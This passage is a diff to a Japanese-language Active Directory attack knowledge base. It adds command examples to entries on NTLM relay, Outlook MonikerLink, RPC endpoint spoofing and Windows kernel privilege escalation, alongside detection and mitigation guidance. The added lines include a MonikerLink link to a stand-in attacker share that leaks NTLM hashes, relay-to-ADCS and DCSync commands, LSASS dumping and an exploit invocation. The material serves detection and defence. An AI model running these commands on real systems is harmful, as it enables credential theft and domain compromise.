     "detect": "最大の勘所は『防御が有効でも成立する』点——DCの5136で、マシンアカウントが他オブジェクトへ msDS-AllowedToActOnBehalfOfOtherIdentity / msDS-KeyCredentialLink を書き込む、あるいはドメインルートの nTSecurityDescriptor にDCSync権限(DS-Replication-Get-Changes*)を付与する異常を、直前のcoercion(5145: efsrpc/spoolss/netdfs パイプ)および別ホスト起点の4624 NTLM Type3と相関する。重要: 本手法は SIGN/SEAL フラグを落として CBT 検証自体を発火させないため、LDAP署名/CB非準拠を示す Directory Services 2889(未署名/未シールバインド)や 3039/3074/3075(CB監査)が発火しない場合がある——これらの『不在』をもってリレーを否定してはならない。NTLMのMIC/MsvAvFlags/ネゴシエートフラグ改変はDC内部のNTLMSSPフィールドでホストEDRから不可視のため、攻撃者ホスト側のntlmrelayxプロセスとDCの389/636接続、認証元IPと実操作元IPの不一致で裏取りする。MDIの Suspected NTLM relay や 4741(新規コンピュータ作成)も併読し、未パッチDC(2025-09以前)の識別を最優先する。",
     "events": "4624(NTLM Type3, 認証元IP不一致), 5145(coercion pipe: efsrpc/spoolss/netdfs/lsarpc), 5136(msDS-AllowedToActOnBehalfOfOtherIdentity/msDS-KeyCredentialLink 追加, またはドメインルート nTSecurityDescriptor 変更), 4741(コンピュータ作成), 4662(DCSync連結時のレプリケーション権限 GUID 1131f6aa/1131f6ad), 4769(Shadow Creds→PKINIT時のTGS); Directory Services 2889(未署名/未シールLDAPバインド)・3039/3074/3075(LDAPチャネルバインディング監査, 本手法では不発の可能性あり); MDI Suspected NTLM relay アラート",
     "mitigate": "最重要: 2025-09-09(September Patch Tuesday)の累積更新(CVE-2025-54918)を全DC/クライアントに適用する。本脆弱性は署名・チャネルバインディング強制を回避するため、従来リレー対策の『署名/EPA必須化』だけでは防げず、パッチが唯一の確実な遮断策である点を運用へ周知する。多層防御として LDAP署名必須(LDAPServerIntegrity=2)+LDAPSチャネルバインディング(LdapEnforceChannelBinding=2)・SMB署名必須は継続し、ms-DS-MachineAccountQuota=0、EFSRPC/Spooler/DFSNM等の不要coercion経路の無効化とRPCフィルタ制限、NTLM制限とKerberos移行、DCへの不要RPCのファイアウォール遮断を実施。RBCD/KeyCredentialLink/nTSecurityDescriptor属性変更の監査アラートを常設し、資産管理で未パッチDCを洗い出す。",
@@ -10482,6 +17068,33 @@ AD.I18N.ja.attacks = [
     "summary": "OutlookのハイパーリンクをMonikerLink('!'記号)で細工し、本来クリック時にブロック/保護ビュー化されるfile:// UNCリンクを保護ビューを回避して開かせる欠陥(CVE-2024-21413, CVSS 9.8, CISA KEV登載の実悪用CVE)。被害者が細工リンクを1クリックするとOutlookがモニカ経由でリモート共有へSMB認証し、Net-NTLMv2が攻撃者UNCへ漏れる。保護ビュー回避により悪性ドキュメントが編集モードで開くためRCEへも連鎖しうる。ユーザ操作不要でリマインダ処理時に発火するCVE-2023-23397(zero-click)とは異なり、本CVEはハイパーリンクへの明示的な1クリック(User Execution)を要する点が本質。",
     "how": "攻撃者はHTMLメール内に`file:///\\\\attacker\\share\\payload.rtf!x`のように末尾へ`!`(感嘆符)とアイテム名を付したハイパーリンクを埋め込み送信する。通常Outlookは`file://`ローカル/UNCリンクのクリックをブロックまたはセキュリティ警告するが、`!`はOLEモニカ構文上でFileMoniker(ファイルパス`\\\\attacker\\share\\payload.rtf`)とItemMoniker(`!`以降の文字列)を連結したComposite Monikerとして解釈される。Outlookがリンク解決に`ole32!MkParseDisplayName()`(モニカ文字列を解析しCOMオブジェクトを探索)→`IMoniker::BindToObject`を用いる過程で、この複合モニカ経路がファイルを通常の「インターネット由来=保護ビュー」判定を経ずにバインドしてしまい、Protected Viewが回避される。副作用としてWindowsが`\\\\attacker\\share`へSMB(445)接続する際に被害者のNet-NTLMv2ハッシュが攻撃者ホストへ送出され(強制認証)、responder/ntlmrelayxで取得・リレー(ESC8/LDAP)・オフラインクラックに供される。さらに保護ビュー回避によりリモートRTFはバックグラウンドのWord COMサーバがMedium integrity・サンドボックスなしの編集モードで解析するため、Officeの別脆弱性等と組み合わせてRCEに至りうる(CVSS 9.8の主因)。被害者の関与は「リンクを1クリック」のみで、メール閲覧やリマインダ処理では発火しない点がCVE-2023-23397(zero-click reminder)と決定的に異なる。Check Point Research(Haifei Li)が2024年に公表し、MSは2024年2月のPatch Tuesdayで修正。モニカ処理は共有MSコンポーネントのためWord等他Officeアプリにも同種の波及がある。前提: 未パッチのOutlook/Office、外向き445(SMB)またはWebDAV到達、NTLM有効。",
     "tools": "Check Point MonikerLink PoC(#MonikerLink), 細工HTMLメール(file://…!モニカ), responder, impacket-ntlmrelayx, swaks/sendemail(メール配信), hashcat(オフラインクラック)",
+    "cmd": [
+      {
+        "tool": "MonikerLink",
+        "t": "被害者が1クリックする実際のリンク文字列、`!`以降のItemMonikerがProtected Viewバイパスの識別子",
+        "q": "file:///\\\\attacker\\share\\payload.rtf!x"
+      },
+      {
+        "tool": "Responder",
+        "t": "被害者OutlookからのSMB認証を捕捉、コマンドラインでなく445への接続とNTLMv2受信が一次証跡になる",
+        "q": "Responder.py -I eth0"
+      },
+      {
+        "tool": "Impacket",
+        "t": "smbserver.pyでも同様に捕捉可能、OUTLOOK.EXEが発信元プロセスとしてSysmon Event3の接続先ログに残る",
+        "q": "smbserver.py share ./loot -smb2support"
+      },
+      {
+        "tool": "Impacket",
+        "t": "捕捉したNet-NTLMv2をリアルタイムでESC8/LDAPへ中継する",
+        "q": "ntlmrelayx.py -t ldaps://dc01.corp.local -smb2support"
+      },
+      {
+        "tool": "Hashcat",
+        "t": "リレーせずオフライン解析する場合、モード5600=NetNTLMv2の出現自体が本手法成立の裏付けになる",
+        "q": "hashcat -m 5600 -a 0 hash.txt rockyou.txt"
+      }
+    ],
     "detect": "被害クライアントでoutlook.exeまたはOutlookから起動したOfficeアプリ(WINWORD/EXCEL等)が外部/未承認IPへ445(SMB)アウトバウンド認証する挙動を監視する。加えてoutlook.exeを親としてWINWORD.EXE等がUNC/`file://`を含む引数で起動する「保護ビュー回避のドキュメントオープン」を相関する。Exchangeのメッセージトレースとメール本文HTMLから`file://…!`形式のハイパーリンクを走査し、Responder/攻撃者IP宛のNet-NTLMv2送出(攻撃側の4624 Type3 NTLM)を突き合わせる。CVE-2023-23397との差はユーザのクリック操作起点である点。",
     "events": "DeviceNetworkEvents(outlook.exe/Office→445), DeviceProcessEvents(outlook.exe親→WINWORD等), 4688(プロセス生成, 要コマンドライン監査), Sysmon 1/3, 4624 Type3(NTLM, 攻撃者/Responder側), 4886/4887・5136(ADCS/LDAPリレー痕跡), Exchangeメッセージトレース",
     "mitigate": "2024年2月のOutlook/Officeセキュリティ更新を最優先で適用する(モニカ経路のProtected Viewバイパスを封鎖。本CVEはCISA KEV登載の実悪用済みのため優先度は高い)。境界およびホストFWで外部445/SMBアウトバウンドとWebClient(WebDAV)を遮断し、UNCの外部到達を断つ。高特権ユーザをProtected Usersに追加、Block NTLM(外向きNTLM制限)ポリシーとSMB署名/EPAを強制してリレー成立条件を狭める。Outlookで`file://`等の危険スキームリンクを警告/無効化し、保護ビューをGPOで強制する。ユーザ教育として外部メールの`file://`リンクを踏ませない。",
@@ -10527,6 +17140,33 @@ AD.I18N.ja.attacks = [
     "summary": "RPC Endpoint Mapper(EPM)がインターフェイスUUIDの『最初の登録』を所有者検証なしに受理する欠陥(CVE-2025-49760/Microsoft: Windows Storage Spoofing)を突き、非特権ユーザが未起動の特権サービス——PoCではWindows Storage Service(StorSvc、遅延起動)——のUUIDを先回り登録して当該サービスになりすます。以降そのUUIDを解決する特権呼び出し元(SafeBreachのPoCで最初に接続したのはWindows Update、PPLで動くDelivery Optimization=DoSvcでも成立)は攻撃者の偽RPCサーバへ誘導され、Local System/マシンアカウントのNet-NTLMを強制認証で捕捉・リレーされる。記録された主連鎖はESC8——マシンアカウント認証をADCS Web登録へリレーしDC等のマシンアカウント証明書を発行→Kerberos TGT→DCSyncでドメイン全体を掌握。SMB/LDAPリレー(RBCD/Shadow Credentials)も代替の末尾。ローカルサービスのIPCはALPC(ncalrpc)でなりすましエンドポイントもALPCポートのため、TCP動的ポートの待受を伴わない点に注意。MicrosoftのCVSSは3.5(Low)だが、保護プロセスを巻き込む強制認証と連鎖影響を織り込みMediumと評価する。SafeBreach(Ron Ben Yizhak)がDEF CON 33で公開、2025年7月に修正。",
     "how": "前提: 標的ホスト上でのコード実行(ユーザ/中整合性の非特権プロセスで足り、管理者権限は不要)と、まだ起動していない特権RPCサービス(遅延起動/オンデマンド起動)の存在。RPC Endpoint Mapper(RpcSs/RpcEptMapper。ローカル照会はncalrpc、リモート照会用にncacn_ip_tcp TCP135でも待受)はインターフェイスUUID→エンドポイントの対応表を保持し、各サービスはRpcEpRegister経由で自身のUUIDとエンドポイントを登録する。脆弱性の核心は、EPMが特定UUIDの『最初の登録』を、登録主体が本来の所有者(Local Systemの特権サービス)か否かを検証せず受理し、以後その最初のエンドポイントを常に返す点(first-registration-wins)。攻撃者はレースに勝ち、特権サービスが起動する前にそのインターフェイスUUIDを自プロセスのエンドポイントで先回り登録する。SafeBreachのPoC(RPC-Racer)はStorSvcのUUIDを奪取し、最初に接続してきた特権サービスがWindows Updateだった。重要な訂正: 対象ローカルサービスのIPCはALPC(ncalrpc)であり、なりすましエンドポイントもALPCポートで、TCP動的ポート(49152-65535)の待受を伴わない。誘導された呼び出し元(PPLで動くDelivery Optimization=DoSvcを含む)は偽サーバを信頼し、その過程でLocal Systemがネットワーク上ではマシンアカウントとして認証するため、攻撃者はそのNet-NTLM(SMB/HTTP)を捕捉できる。捕捉した認証は末尾でリレーされ、記録された主経路はESC8: ntlmrelayxでADCSのWeb登録(certsrv)へ中継しDC等のマシンアカウント証明書を発行→Certipy/RubeusでKerberos TGT取得→secretsdumpでDCSync、というドメイン掌握へ連鎖する。LDAPへ中継してRBCD(msDS-AllowedToActOnBehalfOfOtherIdentity)やShadow Credentials(msDS-KeyCredentialLink)を書き込む代替経路もある。impersonation対象が保護プロセス/PPLでも成立するのが本手法の危険性で、非特権の『RPCサーバなりすまし』プリミティブとして機能する。パッチの実像(重要): Microsoftの公式修正(CVE-2025-49760、2025年7月)はクライアント側——StorSvcのRPCクライアントがLocal System所有のエンドポイントにのみ接続する識別子(QoS)検査を追加するもので、EPMの先回り登録そのものは塞がない。したがって同機序の姉妹サービスは個別修正が必要で、後続でCVE-2025-59200(Data Sharing Service/DsSvc)・CVE-2025-59230(RasMan)が割り当てられた(0patchは代替としてEPM登録側で登録主体がLocal Systemかを検査するマイクロパッチを提供)。SafeBreach, DEF CON 33で公開。",
     "tools": "SafeBreach RPC-Racer (DEF CON 33公開のPoC), impacket rpcdump.py（EPMインターフェイス列挙）, RpcView / RPCMon（RPCインターフェイス監査）, impacket ntlmrelayx.py（リレー末尾: SMB/LDAP/HTTP-ADCS）, Certipy（ESC8証明書取得・DCSync）, Rubeus / impacket getST（証明書→Kerberos TGT）, impacket secretsdump.py（DCSync）",
+    "cmd": [
+      {
+        "tool": "RPC-Recon",
+        "t": "未起動の遅延開始特権サービスをEPMとプロセスメモリ走査で列挙、管理者権限とメモリ読取アクセスが痕跡",
+        "q": "RPC-Recon.exe /register"
+      },
+      {
+        "tool": "RPC-Racer",
+        "t": "StorSvcのインターフェースUUIDを先回り登録し攻撃者IPへリレー、非特権プロセスによる135/EPM登録が数少ない痕跡",
+        "q": "StorSvc-Racer.exe 10.0.0.5"
+      },
+      {
+        "tool": "Impacket",
+        "t": "誘導したLocal SystemのマシンアカウントNTLMをESC8へ中継し証明書を発行する",
+        "q": "ntlmrelayx.py -t http://ca.corp.local/certsrv/certfnsh.asp --adcs --template Machine -smb2support"
+      },
+      {
+        "tool": "Certipy",
+        "t": "発行された証明書でPKINIT認証、`-pfx`指定のみで完結し以後DCSyncへ連鎖する",
+        "q": "certipy auth -pfx dc01.pfx -dc-ip 10.0.0.10"
+      },
+      {
+        "tool": "Impacket",
+        "t": "マシンアカウントの文脈でDCSyncを実行しドメイン全体を掌握する",
+        "q": "secretsdump.py -just-dc corp.local/dc01\\$@dc01.corp.local"
+      }
+    ],
     "detect": "本手法のEPM登録操作は標準セキュリティ監査に専用イベントIDを持たず、しかもローカルRPC(ALPC/ncalrpc)のため端末のネットワーク監視には現れない。第一の着眼はETW。(1) Microsoft-Windows-RPC/RPCSSのETWで、既知の特権サービスのインターフェイスUUIDが、当該サービスのプロセス(サービスSID/署名イメージ/Local System)以外の非特権プロセスから、かつ本来のサービス起動前に登録される異常(RpcEpRegister)——これが唯一の直接的な一次シグナル。(2) なりすまし成立後、SYSTEM/マシンアカウントのサービスがループバックまたは外部の攻撃者SMBへNTLM強制認証(4624 Type3/4776、DeviceNetworkEventsの外向き445)。(3) 連鎖末尾ESC8: CA上のADCS証明書発行監査4886/4887で、Requester/発行元IPと発行先Subject(DCマシンアカウント$)が不一致の発行。(4) LDAPリレー代替では5136(msDS-AllowedToActOnBehalfOfOtherIdentity/msDS-KeyCredentialLink書込み)。注意: 動的RPCポート(49152-65535)やTCP135のリスナ検知はローカルALPCなりすましには低利得で補助シグナルに留まる。テレメトリ源: ETW RPC/RPCSSプロバイダ, Sysmon EID1/3, Security 4624/4776, ADCS 4886/4887, ディレクトリ監査5136, MDIのIdentityLogonEvents/ADCS・NTLMリレー検知。",
     "events": "ETW Microsoft-Windows-RPC / RPCSS（RpcEpRegister/インターフェイス登録。標準Securityログには残らない——唯一の直接痕跡）, Sysmon EID1（先回り登録PoC=RPC-Racer/rpcdump等のツールプロセス）, Sysmon EID3 / DeviceNetworkEvents（強制認証の外向きSMB445。なりすましエンドポイント自体はALPCで非TCP）, 4624 Type3 / 4776（マシンアカウントのNTLM強制認証: ループバックまたは攻撃者SMB宛）, ADCS 4886/4887（ESC8: 証明書要求・発行——Requesterと発行先マシンアカウントの不一致=記録された連鎖の末尾）, 5136（msDS-AllowedToActOnBehalfOfOtherIdentity / msDS-KeyCredentialLink: LDAPリレー代替の副作用）, 4698（タスク登録・下流）",
     "mitigate": "(1) パッチ適用が本命だが正確な理解が要る——CVE-2025-49760(2025年7月)の公式修正はクライアント側で、StorSvcのRPCクライアントがLocal System所有のエンドポイントにのみ接続する識別子(QoS)検査を加えるもの。EPMの先回り登録そのものは塞がないため、同機序の姉妹サービスは個別修正が必要: CVE-2025-59200(DsSvc)・CVE-2025-59230(RasMan)も適用し、後続CVEを追跡する。恒久のサーバ側封じ込めが要る環境では、EPM登録主体がLocal Systemかを検査する0patchマイクロパッチが代替。(2) RPCクライアントの認証・識別子検査を厳格化(RPC_C_AUTHN_LEVEL_PKT_PRIVACY、相互認証/サーバ識別子検証)し、偽サーバへの接続・認証中継を無効化。(3) 連鎖末尾の封鎖が最重要: ESC8対策としてADCS Web登録(certsrv)でHTTPS+EPA(拡張保護)を強制しCA上のNTLMを無効化、証明書マネージャ承認/登録エージェント要求を検討。加えてLDAP署名＋チャネルバインディング(CBT)を『常に』へ、SMB署名を全ホスト強制、可能ならNTLMを制限/廃止しKerberos強制。(4) ETW RPC/RPCSSでインターフェイス登録主体を監査し、非サービス/非Local Systemプロセスによる特権サービスUUID登録をアラート。(5) ティアリングでマシンアカウントの過剰なローカル管理者権限とリレーの実効価値を下げる。(6) 特権サービスの遅延/オンデマンド起動に依存した競合窓を減らす(恒久策はあくまで各サービスの修正)。",
@@ -10577,6 +17217,28 @@ AD.I18N.ja.attacks = [
     "summary": "CLFS(Common Log File System)カーネルドライバ clfs.sys のベースログ(.BLF)解析に潜むヒープオーバーフロー/UAF/OOB書込を悪用し、カーネルメモリを破壊して任意R/Wを獲得するローカル権限昇格。低権限プロセスから自プロセスの_EPROCESSトークンをSYSTEMのトークンで上書き、あるいは特権ビットマップを全ビット化してSYSTEMへ昇格する。2022年以降ランサムウェアで最も繰り返し武器化されている「初期侵入→SYSTEM」の定番プリミティブで、clfs.sysはOS標準搭載のためBYOVD不要、悪用はカーネル内で完結しほぼファイルレス。",
     "how": "前提: 任意コード実行が可能な低権限ユーザ(Medium/Low Integrity)。攻撃者はCLFSのユーザ側API(clfsw32.dll の CreateLogFile / AddLogContainer 等)で不正な.BLFベースログを作成、または細工済みBLFを直接配置する。BLFのベースブロックに含まれる制御レコード(CLFS_CONTROL_RECORD)・コンテナコンテキスト・クライアントコンテキスト内のオフセット/サイズ値(cbSymbolZone や各種offset)を矛盾させると、clfs.sys のログ管理呼び出し時にプールのOOB書込(CVE-2023-28252)、ヒープベースバッファオーバーフロー(CVE-2024-49138)、または解放済みオブジェクトへのUAF(CVE-2025-29824)が発生する。いずれもBLFパースのバグファミリで、この破壊を足がかりにカーネル任意R/Wプリミティブへ発展させる。NtQuerySystemInformation 等でリークしたカーネルアドレスを用い、現在プロセスの_EPROCESS内Token参照をSYSTEMプロセスのトークンで上書き、または SEP_TOKEN_PRIVILEGES を RtlSetAllBits 相当で全特権化してSYSTEMを得る。以降はSYSTEM権限で正規プロセス(winlogon.exe 等)へ注入し、LSASSダンプ・ランサム展開へ連鎖する。CVE-2025-29824の実観測ではエクスプロイトが C:\\ProgramData 配下(例: SkyPDF\\PDUDrv.blf)へ.BLFを生成し、dllhost.exe 等の無害に見えるプロセス内から起動、clssrv.inf を winlogon.exe に注入してprocdump等を後続展開した。CLFSはOS標準コンポーネントのため脆弱ドライバ持込(BYOVD)は不要で、Nokoyawa(2023)やStorm-2460/PipeMagic→Playランサム(2025)などランサム系アクターが多数のゼロデイを連続投入している。",
     "tools": "Nokoyawa ランサムウェアのローダ, PipeMagic(Storm-2460)/Playランサム系(Balloonfly), 公開Exploit/PoC(clfs.sys CVE-2023-28252 / CVE-2024-49138 / CVE-2025-29824), clfsw32.dll API を用いたカスタムBLFクラフタ, 後続で procdump / rundll32 comsvcs.dll MiniDump によるLSASS窃取",
+    "cmd": [
+      {
+        "tool": "PowerShell",
+        "t": "実観測ではProgramData配下に非標準の.BLF(例:SkyPDF\\PDUDrv.blf)が生成され悪用の起点となる。新規.blf作成の監視が有効",
+        "q": "Get-ChildItem -Path C:\\\\ProgramData -Recurse -Filter *.blf -ErrorAction SilentlyContinue"
+      },
+      {
+        "tool": "ProcDump",
+        "t": "SYSTEM昇格後の定番後続。LSASSダンプで資格情報を窃取、`-ma`と`lsass`の組合せが強シグナル",
+        "q": "procdump64.exe -accepteula -ma lsass.exe C:\\\\Windows\\\\Temp\\\\lsass.dmp"
+      },
+      {
+        "tool": "rundll32.exe",
+        "t": "procdumpを使わないLOLBin代替。comsvcs.dllの`MiniDump`エクスポート呼び出しが検知の主軸",
+        "q": "rundll32.exe C:\\\\Windows\\\\System32\\\\comsvcs.dll, MiniDump 668 C:\\\\Windows\\\\Temp\\\\lsass.dmp full"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "パッチ適用確認。clfs.sysのファイルバージョンで2023/2024/2025の3件のCVE修正状況をまとめて判定",
+        "q": "Get-Item C:\\\\Windows\\\\System32\\\\drivers\\\\clfs.sys | Select-Object -ExpandProperty VersionInfo | Select-Object FileVersion,ProductVersion"
+      }
+    ],
     "detect": "clfs.sys の解析破壊はカーネル内で完結しほぼファイルレスのため、解析イベント単体では痕跡が残らない。検知は(1)正規パス以外への.BLF生成(Sysmon EID11 / MDE DeviceFileEvents。正規は System32\\config のTxRログ、ProgramData\\Microsoft\\Search、ServiceProfiles 配下、KTMトランザクション等)、(2)低/中Integrityの非サービスプロセスを親とするSYSTEM子プロセスの出現やトークン昇格(4688 の TokenElevationType / 4672 特殊特権割当)、(3)エクスプロイト失敗時のカーネルBugcheck(System 1001、0x139 KERNEL_SECURITY_CHECK_FAILURE、faulting module = clfs.sys 等)とWERクラッシュダンプ、を相関する。EDRのエクスプロイト保護/メモリ破壊検知、ProgramData配下の見慣れないサブフォルダ生成も指標。",
     "events": "Sysmon 11(.BLF FileCreate — 非正規パス), Sysmon 1(SYSTEM子プロセス/注入元), 4688(プロセス作成・TokenElevationType), 4672(特殊特権割当), 4673/4674(特権呼出), System 1001(Microsoft-Windows-WER-SystemErrorReporting BugCheck)/41(Kernel-Power)/6008(EventLog: 予期しないシャットダウン), MDE DeviceFileEvents(.blf)/DeviceProcessEvents(トークン昇格), WER LiveKernelReports/Minidump",
     "mitigate": "該当CUの適用が最優先: CVE-2023-28252=2023年4月、CVE-2024-49138=2024年12月、CVE-2025-29824=2025年4月の月例更新(一部OSは提供遅延ありのため配布状況を要確認)。CLFS BLFのHMAC整合性検証(システム固有鍵でBLF/コンテナにSHA-256 HMACを付与し開封時に検証、無効BLFの解析を拒否)を備えた新しいWindows(11 24H2 / Server 2025で既定、Win10・Server 2019/2022は更新で任意展開。約90日の学習モード後に強制。fsutil clfs authenticate で既存BLFへ付与)への更新でBLF改ざん悪用を検知/抑止できる。EDRのエクスプロイト保護・ASRルールを有効化し、最小権限とアプリ制御(WDAC/AppLocker)で初期コード実行そのものを抑える。.BLFの非正規パス生成とSYSTEM昇格の挙動監視をSIEMへ常設し、ProgramData/Temp配下の未知.BLFを継続ハントする。",
@@ -10622,6 +17284,28 @@ AD.I18N.ja.attacks = [
     "summary": "WinSock用補助関数ドライバ afd.sys が低権限ユーザランドに公開するIOCTLの処理欠陥を突き、カーネルメモリを操作して呼び出し元プロセスをSYSTEMへ昇格させるpost-exploitation LPEプリミティブ。CVE-2023-21768は制約付きカーネル書き込みをWindows I/O Ring悪用で任意読み書きへ拡張しトークンを窃取、CVE-2024-38193はUse-After-Free 0-dayでLazarusがFudModuleルートキットのローダに連鎖させた。いずれも組み込みドライバの脆弱性であり、第三者ドライバを持ち込むBYOVDではない点が特徴で、ドライバ署名/ブロックリスト系の対策をすり抜ける。",
     "how": "afd.sysはWinSock補助関数ドライバとして\\Device\\Afdを低権限プロセスにも公開し、DeviceIoControlでIOCTLを受け付ける。CVE-2023-21768ではIOCTLハンドラ(AfdNotifySock系の完了処理、内部でAfdNotifyRemoveIoCompletionを呼ぶ)が結果の書き戻し先ポインタをユーザモード範囲か検証せず、攻撃者が指定したカーネルアドレスへ固定値0x1を書き込む「制約付き書き込み(constrained write)」が生じる(CWE-822 Untrusted Pointer Dereference)。著名な公開PoC(IBM X-Force / chompie1337)はこの固定値書き込みを直接トークン改ざんに使わず、Windows I/O Ring(IORING_OBJECT)の構造体(RegBuffers/RegBuffersCount)を破壊(RegBuffersCountの最下位バイトを0x00→0x01に、続いてRegBuffersをユーザ制御アドレスに)して任意カーネル読み書き(arbitrary kernel R/W)へ格上げする。得た任意R/Wでnt!_EPROCESSを辿り、対象プロセスのTokenポインタをSYSTEMプロセス(PID 4)のトークンに置換(token theft/replacement)して呼び出し元をSYSTEM化する。汎用的な代替としてPreviousModeの上書きも理論上可能だが、これは別プリミティブであり著名PoCの実機序ではない(実体は「制約付き書き込み→IORINGによる任意R/W→トークン窃取」)。CVE-2024-38193は組み込みafd.sysのUse-After-Free 0-dayで、解放済みオブジェクトの再確保を制御してカーネルR/Wを獲得し、LazarusがこれをFudModuleルートキットのローダへ連鎖させ、カーネルコールバック無効化やDKOMでEDRを盲目化した。前提はローカルの低権限コード実行(初期侵入後のpost-ex)で、AD文脈では被害端末のSYSTEM取得→LSASS窃取・横展開の踏み台になる。afd.sysは無効化不能の標準ドライバのため、ロード監視では検知できずパッチ適用が本質的対策となる。",
     "tools": "CVE-2023-21768 PoC(chompie1337 / IBM X-Force, I/O Ring悪用型), Metasploit(afd/winsock系LPEモジュール), FudModuleローダ(Lazarus, CVE-2024-38193連鎖), 各種公開afd.sys LPEスクリプト(AfdNotifySock/IORING利用)",
+    "cmd": [
+      {
+        "tool": "AFD LPE",
+        "t": "chompie1337公開PoC(CVE-2023-21768)。引数はSYSTEM化対象のPID一つのみで実行ファイル名自体が強シグナル",
+        "q": "Windows_AFD_LPE_CVE-2023-21768.exe 4104"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "パッチ適用確認(CVE-2023-21768)。Win11 22H2向け2023年1月更新の適用有無を照合",
+        "q": "Get-HotFix -Id KB5022303"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "パッチ適用確認(CVE-2024-38193)。Win11 22H2/23H2向け2024年8月更新。FudModule連鎖の前提を排除できる",
+        "q": "Get-HotFix -Id KB5041585"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "afd.sysは無効化不能な標準ドライバでロード監視は無意味。Sysmon EventID1のIntegrityLevelがSystemに変化した非サービス起源プロセスを追う",
+        "q": "Get-WinEvent -LogName 'Microsoft-Windows-Sysmon/Operational' -FilterXPath \"*[System[(EventID=1)] and EventData[Data[@Name='IntegrityLevel']='System']]\""
+      }
+    ],
     "detect": "afd.sysは正規に常時使われる組み込みドライバのためロード監視は無力で、焦点は「トークン窃取の副作用」と「post-ex連鎖」に置く。低整合性(Medium/Low IL)で起動したプロセスが突如SYSTEM/High ILの子プロセスを生成する権限逆転(4688 / MDE DeviceProcessEventsのIntegrityLevel不整合)、その直後のLSASSアクセス(Sysmon EID10 GrantedAccess 0x1010/0x1410)を相関する。カーネル破壊失敗時のBugcheck(System 1001 / 0x139 KERNEL_SECURITY_CHECK_FAILURE等、afd.sys関与)がユーザランド起点で反復するのも強シグナル。CVE-2024-38193ではFudModule連鎖に伴うカーネルコールバック/EDRセンサ停止を併せて監視する。",
     "events": "4688(新規プロセス/親子の整合性・権限逆転, TokenElevationType), 4672(想定外コンテキストへのSYSTEM相当特権付与), Sysmon EID1/10(プロセス生成/LSASSアクセス), System 1001・Bugcheck 0x139/0xC4等(悪用失敗時のクラッシュ, afd.sys関与), MDE DeviceProcessEvents/DeviceEvents(IntegrityLevel・OpenProcessApiCall)",
     "mitigate": "CVE-2023-21768は2023年1月、CVE-2024-38193は2024年8月の定例パッチ適用が必須で、後者はCISA KEV収載のため優先度最高。HVCI(メモリ整合性)/Credential Guard/LSA保護を有効化し、カーネル改ざん・トークン窃取後の資格情報アクセスやFudModuleのカーネル書き換えを阻害する。EDRの改ざん検知とASR(Attack Surface Reduction)を有効化してpost-ex連鎖を遮断する。afd.sysは無効化不能の組み込みドライバのため、パッチに加え最小権限・アプリケーション制御で初期侵入時の低権限コード実行そのものを抑止することが実質的防御となる。",
@@ -10667,6 +17351,38 @@ AD.I18N.ja.attacks = [
     "summary": "Print Spooler の `SpoolDirectory` 設定を低権限ユーザが任意パスへ変更し、SYSTEM で動くスプーラサービスがそのディレクトリを「存在しなければ作成し、全ユーザ書込可でなければ Everyone 書込可の DACL を付与する」挙動を、NTFS ディレクトリジャンクション＋`\\\\localhost\\C$\\...` UNC パス(旧 CVE-2020-1030 対策の SpoolDirectory パス検証を回避)で悪用するローカル権限昇格。攻撃者は world-writable 化したプリンタドライバディレクトリ `C:\\Windows\\System32\\spool\\drivers\\x64\\`(例: バージョン `\\4\\` 配下)へ DLL を配置し、`SetPrinterDataEx` の `CopyFiles\\Module` 機能で spoolsv.exe(SYSTEM)に当該 DLL をロード・実行させて任意コードを SYSTEM 実行する(印刷プロセッサ登録 AddPrintProcessor は使わない)。PrintNightmare の Point-and-Print RCE が緩和済みの環境でも高信頼に SYSTEM を奪取でき、攻撃者制御の world-writable ドライバディレクトリ＋DLL 植え込み＋CopyFiles ロードという独立した検知対象になる。",
     "how": "前提: 対象ホストで Print Spooler サービスが稼働し、認証済みの低権限ローカル(対話=INTERACTIVE)ユーザがプリンタの追加/設定変更を行えること(既定でユーザに許可)。(1) `SetPrinter`/`SetPrinterDataEx` 等でプリンタの `SpoolDirectory` 値(HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Printers\\<printer>\\SpoolDirectory)を攻撃者制御パスへ設定する。(2) スプーラは(再)起動時に各プリンタの SpoolDirectory を検査し、存在しなければ SYSTEM 権限で作成し、全ユーザ書込可でなければ Everyone 書込可の DACL を付与する。ly4k(Oliver Lyak)の肝は、旧 CVE-2020-1030 で追加された SpoolDirectory パス検証を、ユーザ書込可の一時ディレクトリ(temp\\GUID)に張った NTFS ディレクトリジャンクションと `\\\\localhost\\C$\\...` UNC パスの二段で回避し、本来非管理者が書けない `GetPrinterDriverDirectory` が返すプリンタドライバディレクトリ `C:\\Windows\\System32\\spool\\drivers\\x64\\`(バージョン `\\4\\` 配下)を world-writable 化させる点。(3) world-writable 化したドライバディレクトリへ悪意ある DLL を(低権限プロセスが)配置する。(4) `SetPrinterDataEx(pHandle,\"CopyFiles\\\\\",\"Module\",...,<DLLパス>)` を呼ぶと、spoolsv.exe(SYSTEM)がその「モジュール」DLL をドライバディレクトリからロードしエクスポートを実行し、SYSTEM で任意コードが走る。この「攻撃者制御ディレクトリへ植えた DLL を spoolsv の正規機能(CopyFiles)で強制ロード」という機序は DLL 探索順ハイジャック(T1574.001)ではなく側面ロード(T1574.002)/一般 T1574 に整合し、印刷プロセッサ登録(AddPrintProcessor)は用いない。スプーラの再起動は、正規 DLL `C:\\Windows\\System32\\AppVTerminator.dll` を CopyFiles\\Module に指定してロードさせスプーラを異常終了→サービス自動復旧させる手口で行い、`net stop/start spooler` や OS 再起動を伴わない。ly4k の既定ペイロード AddUser.dll は子プロセスを生成せず spoolsv 内(DllMain)で `NetUserAdd`＋`NetLocalGroupAddMembers` を実行しローカル管理者 `admin/Passw0rd!` を作成するため、プロセスラインではなくレジストリ変更・`drivers\\x64` への DLL 出現・4720/4732 が主シグナルになる。認証・管理者権限は不要で、パッチ未適用ならリブート不要かつ高信頼に SYSTEM へ昇格する。",
     "tools": "ly4k/SpoolFool (SpoolFool.exe / SpoolFool.ps1, GitHub), Metasploit exploit/windows/local/cve_2022_21999_spoolfool_privesc, CopyFiles モジュール DLL ペイロード(既定 AddUser.dll=ローカル管理者 admin/Passw0rd! 作成), NTFS ディレクトリジャンクション/リパースポイント作成(API ベース、mklink /J でも可), PowerShell(レジストリ SpoolDirectory 操作 / Set-PrinterProperty)",
+    "cmd": [
+      {
